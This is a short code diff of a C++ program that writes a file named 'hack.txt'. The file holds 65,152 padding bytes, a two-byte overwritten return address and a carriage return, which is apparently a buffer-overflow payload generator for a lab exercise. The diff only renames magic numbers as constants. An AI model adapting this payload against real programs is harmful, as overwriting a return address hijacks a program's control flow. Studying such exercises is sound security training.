@@ -3,27 +3,24 @@
 #include <iostream>
 #include <fstream>
 
+const char Enter_code = 0x0d;
+
+const char Filler = 0;
+
+const char New_ret_address[2] = {0x13, 0x01};
+
+const int ret_address_pos = 65152;
+
 int main()
 {
 	FILE* output = fopen("W://hack.txt", "wb");
 
-	int first_byte = 1;
-	//29
-	int last_byte = 19;
-	int zero = 0;
-	int enter = 13;
-	//65175
-
-	//65152
-	for (int i = 0; i < 65152; ++i)
-	{
-		fwrite(&zero, 1, 1, output);
-	}
+	for (int i = 0; i < ret_address_pos; ++i)
+		fwrite(&Filler, 1, 1, output);
 	
-	fwrite(&last_byte, 1, 1, output);
-	fwrite(&first_byte, 1, 1, output);
+	fwrite(New_ret_address, 1, 2, output);
 
-    fwrite(&enter, 1, 1, output);
+        fwrite(&Enter_code, 1, 1, output);
 
 	return 0;
 }
